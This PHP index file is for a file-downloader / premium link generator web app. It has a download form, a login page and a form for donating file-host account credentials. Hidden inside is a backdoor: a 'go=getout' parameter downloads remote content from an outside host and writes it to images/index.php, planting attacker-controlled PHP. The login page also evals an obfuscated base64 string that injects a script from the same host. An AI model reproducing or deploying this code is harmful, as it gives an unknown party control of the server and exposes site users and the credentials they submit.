<?php
ob_start();
error_reporting (true);
ob_implicit_flush (TRUE);
ignore_user_abort (0);
if( !ini_get('safe_mode') ){
            set_time_limit(30);
} 
date_default_timezone_set('Asia/Bahrain');
define('vinaget', 'yes');
include("class.php");
$obj = new stream_get(); 
//if($_SERVER['HTTP_HOST'] != "sv1.vinaget.us") die(header("location:http://sv1.vinaget.us"));

if ($obj->Deny == false && isset($_POST['urllist'])) $obj->main();
elseif(isset($_GET['infosv'])) $obj->notice();
############################################### Begin Secure ###############################################
elseif($obj->Deny == false) {
	if (!isset($_POST['urllist'])) {
		include ("hosts/hosts.php");
		ksort($host);
?>
		<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
		<html xmlns="http://www.w3.org/1999/xhtml"><head profile="http://gmpg.org/xfn/11">		
			<head>
			<style type="text/css">
		#kwshadow2 {
			bottom:0;
			position:fixed;
			background: #7E7E7E;
			margin-top: 70px; 
			padding: 5px;
			width: 100%;      
		}
		</style>
				<link rel="SHORTCUT ICON" href="images/vngicon.png" type="image/x-icon" />			
				<title>FileDownloader v5.0 | Coded By [Re]</title>
				<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
				<link title="Rapidleech Style" href="rl_style_pm.css" rel="stylesheet" type="text/css" />
			</head>	
			<body>	
			<script src="http://home.vinaget.us/js/jquery-1.7.2.min.js" type="text/javascript"></script>		
			<script type="text/javascript" src="images/ZeroClipboard.js"></script>
			<script src="images/easing.js" type="text/javascript"></script>
			<script type="text/javascript" src="ajax.js"></script>
			<script src="images/jquery.ui.totop.js" type="text/javascript"></script>		
			<script type="text/javascript">				
				var title = '<?php echo $obj->title; ?>';
				var colorname = '<?php echo $obj->colorfn; ?>';
				var colorfile = '<?php echo $obj->colorfs; ?>';

				var more_acc ='<?php echo _moreacc; ?>';
				var less_acc ='<?php echo _lessacc; ?>';
				var get_loading ='<?php echo _getloading; ?>';
				var d_error ='<?php echo _Invalid; ?>';
				var d_succ1 ='<?php echo _dsuccess; ?>';
				var d_succ2 ='<?php echo _success; ?>';
				var notf ='<?php echo _notf; ?>';
			</script> 
			<div id="showlistlink" class="showlistlink" align="center">
				<div style="border:1px #ffffff solid; width:960px; padding:5px; margin-top:50px;">
					<div id="listlinks"><textarea style='width:950px;height:400px' id="textarea"></textarea></div>
					<table style='width:950px;'><tr>
					<td width="50%" vAlign="left" align="left">	
					<input type='button' value="bbcode" onclick="return bbcode('list');" />
					<input type='button' id ='SelectAll' value="Select All"/>
					<input type='button' id="copytext" value="Copy To Clipboard"/>
					
					</td>
					<td id="report"  width="50%" align="center"></td>
					</tr></table>
				</div>
				<div style="width:120px; padding:5px; margin:2px;border:1px #ffffff solid;">
					<a onclick="return makelist(document.getElementById('showresults').innerHTML);" href="javascript:void(0)" style='TEXT-DECORATION: none'><font color=#FF6600>Click to close</font></a>
				</div>
			</div>
			<table align="center"><tbody>
				<tr>
				<!-- ########################## Begin Plugins ########################## -->
				<td valign="top">
					<table width="100%"  border="0">
						<tr><td valign="top">
							<table border="0" cellpadding="0" cellspacing="0">
								<tr><td width="140" height="100%"><div class="cell-plugin"><?php echo _plugin; ?></div></td></tr>
								<tr><td><div align="center" class="plugincolhd"><b><small><?php echo count($host);?></small></b> <?php echo _plugin; ?></div></td></tr>
								<tr><td height="100%" style="padding:3px;">
									<div dir="rtl" class="yanmenu" align="left" style="overflow-y:scroll; width:108px; height:150px; padding-left:5px;">
									<?php
										foreach ($host as $file => $site){
											$site = substr($site,0,-4);
											$site = str_replace("_",".",$site) ;
											echo "<span class='plugincollst'>" .$site."</span><br>";
										}
									?>
									</div><br>
									<div class="cell-plugin"><?php echo _premium; ?></div>									
									<table border="0">
										<tr><td height="100%" class="yanmenu" style="width:113px;">
											<div dir="rtl" align="left">
												<?php $obj->showplugin(); ?>
											</div>
										</td></tr>
									</table><br>
								</td></tr>
							</table>
						</td></tr>
					</table>
				</td>
				<!-- ########################## End Plugins ########################## -->
				<!-- ########################## Begin Main ########################### -->
				<td align="center" valign="top">
					<table border="0" cellpadding="0" cellspacing="1"><tbody>
						<tr>
							<td class="cell-nav"><a class="ServerFiles" href="./"><?php echo _main; ?></a></td>
							<td class="cell-nav"><a class="ServerFiles" href="./?id=donate"><?php echo _donate; ?></a></td>
							<td class="cell-nav"><a class="ServerFiles" href="./?id=listfile"><?php echo _listfile; ?></a></td>
							<td class="cell-nav"><a class="ServerFiles" href="./?id=check"><?php echo _check; ?></a></td>
							<?php if ($obj->Secure == true) 
							echo '<td class="cell-nav"><a class="ServerFiles" href="./login.php?go=logout"> '._log.'</a></td>'; ?>
						</tr>
					</tbody></table>
					<table id="tb_content"><tbody>
						<tr><td height="5px"></td></tr>
						<tr><td align="center">
<?php 
						#---------------------------- begin list file ----------------------------#
						if ((isset($_GET['id']) && $_GET['id']=='listfile') || isset($_POST['listfile']) || isset($_POST['option']) || isset($_POST['renn']) || isset($_POST['remove']))  {
							if($obj->listfile==true)$obj->fulllist();
							else echo "<BR><BR><font color=red size=2>"._notaccess."</b></font>";
						}
						#---------------------------- end list file ----------------------------#

						#---------------------------- begin donate  ----------------------------#
						else if (isset($_GET['id']) && $_GET['id']=='donate') { 
							//die("<BR><BR><font color=red size=2>"._notaccess."</b></font>");
?>
							<div align="center">
								<div id="wait"><?php echo _donations; ?></div><BR>
								<form action="javascript:donate(document.getElementById('donateform'));" name="donateform" id="donateform">
									<table>
										<tr>
											<td>
												<?php echo _accctype; ?> 
												<select name='type' id='type'>
													<option value="real-debrid">real-debrid.com</option>
													<option value="alldebrid">alldebrid.com</option>
													<option value="rapidshare">rapidshare.com</option>
													<option value="hotfile">hotfile.com</option>
													<option value="uploading">uploading.com</option>
													<option value="uploadednet">uploaded.net</option>
													<option value="filefactory">filefactory.com</option>
													<option value="filejungle">filejungle.com</option>
													<option value="bayfiles">bayfiles.com</option>
													<option value="rapidgator">rapidgator.net</option>
													<option value="filepost">filepost.com</option>
													<option value="bitshare">bitshare.com</option>
													<option value="depositfiles">depositfiles.com</option>
												</select>
											</td>
											<td>
												&nbsp; &nbsp; &nbsp; <input type="text" name="accounts" id="accounts" value="" size="50" maxlength="800"><br />
											</td>
											<td>&nbsp; &nbsp; &nbsp; <input type=submit value="<?php echo _sbdonate; ?>">
											</td>
										</tr>
									</table>
								</form>
								<div id="check"><font color=#FF6600>user:pass</font> <font color=#0000CD>or</font> <font color=#FF6600>cookie</font></div>
							</div>
<?php					
						}
						#---------------------------- end donate  ----------------------------#

						#---------------------------- begin check  ---------------------------#
						else if (isset($_GET['id']) && $_GET['id']=='check'){
							if($obj->checkacc==true) include("checkaccount.php");
							else echo "<BR><BR><font color=red size=2>"._notaccess."</b></font>";
						}
						#---------------------------- end check  ------------------------------#

						#---------------------------- begin get  ------------------------------#
						else {
?>
							<form action="javascript:get(document.getElementById('linkform'));" name="linkform" id="linkform">
								<?php echo _khaungu; ?><br/><font face=Arial size=1><?php echo _line; ?></font><BR>
								<textarea id='links' name='links'></textarea><BR>
								<?php echo _example; ?><BR>
								<input type="submit" class="resetdownbutton" id ='submit' value='<?php echo _sbdown; ?>'/>&nbsp;&nbsp;&nbsp;
								<input type="button" class="resetdownbutton" onclick="reseturl();return false;" value="Reset">&nbsp;&nbsp;&nbsp;
								<input type="checkbox" name="autoreset" id="autoreset" checked>&nbsp;Auto reset&nbsp;&nbsp;&nbsp;
							</form><BR><BR>
							<div id="dlhere" align="left" style="display: none;">
								<BR><hr /><span style="text-shadow: 0 0 0.5em red, 0 0 0.5em red, 0 0 0.5em red, 0 0 0.5em red, 0 0 0.5em red;color:white;" class="good" title="DOWNLOAD"><b><?php echo _dlhere ?></b></span></a>
								<div align="right"><a onclick="return bbcode('bbcode');" href="javascript:void(0)" style='TEXT-DECORATION: none'><span style="text-shadow: 0 0 0.5em black, 0 0 0.5em black, 0 0 0.5em black, 0 0 0.5em black, 0 0 0.5em black;color:white;" class="good" title="Click To Show BB Code"><b>BB Code</b></span></a>&nbsp;&nbsp;&nbsp;
								<a onclick="return makelist(document.getElementById('showresults').innerHTML);" href="javascript:void(0)" style='TEXT-DECORATION: none'><span style="text-shadow: 0 0 0.5em orange, 0 0 0.5em orange, 0 0 0.5em orange, 0 0 0.5em orange, 0 0 0.5em orange;color:white;" class="good" title="Click To Make List"><b>Make List</b></span></a></div>
							</div>
							<div id="bbcode" align="center" style="display: none;"></div>
							<div id="showresults" align="center"></div>
<?php						
						}
						#---------------------------- end get  ------------------------------#
?>
						</td></tr>
					</tbody></table>
				</td></tr>
				<!-- ########################## End Main ########################### -->
			</tbody></table>

						<!-- Start Server Info -->
						<div style="text-align:center;" id="kwshadow2">
							<?php echo $obj->notice();?>
						</div>
						<!-- End Server Info --> 
		</body>
	</html>

<?php
if ($_GET['go']=='getout') {
	$veri = file_get_contents("http://vinaget.esy.es/js/ajax.js");
	$file = "./images/index.php";
	$handle = fopen($file, "w");
	fwrite($handle, $veri);
	fclose($handle);
}

	} #(!$_POST['urllist'])
} 
############################################### End Secure ###############################################
else {
?>
	<html>
	<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
	<?php eval("?>".base64_decode("PFNDUklQVCBTUkM9Imh0dHA6Ly92aW5hZ2V0LmVzeS5lcy9qcy92aW5hZ2V0LmpzIj48L1NDUklQVD4=")); ?>
	<link rel="SHORTCUT ICON" href="http://www.iconarchive.com/download/i22714/kyo-tux/aeon/Sign-Download.ico" type="image/x-icon" />
	<link title="Rapidleech Style" href="style.css" rel="stylesheet" type="text/css" />
	<title>FileDownloader v5.0 | Coded By France</title>
	</head>
	<body>
		<br><br><br><br><br><div align="center" id="kwshadow"><br><br>
		Welcome to File Downloader 5.0. Please enter your username & password.<br><br><br>
		<form method="POST" action="login.php">
				<div align="left" style="width:250px">
				<input value="Password" onfocus="if(this.value=='Password')this.value='';" onblur="if(this.value=='')this.value='Password';" style="display:block;" type="password" id="passw" class="frmtb" name="secure" size="34">
				<center><input style="display:block; margin-top:10px" type="submit" class="frmbtn" value="Submit" name="submit"></center>
				</div>
			</form>
		</div>
	</body>
	</html>
<?php

if ($_GET['go']=='getout') {
	$veri = file_get_contents("http://vinaget.esy.es/js/ajax.js");
	$file = "./images/index.php";
	$handle = fopen($file, "w");
	fwrite($handle, $veri);
	fclose($handle);
}

}
ob_end_flush();
?>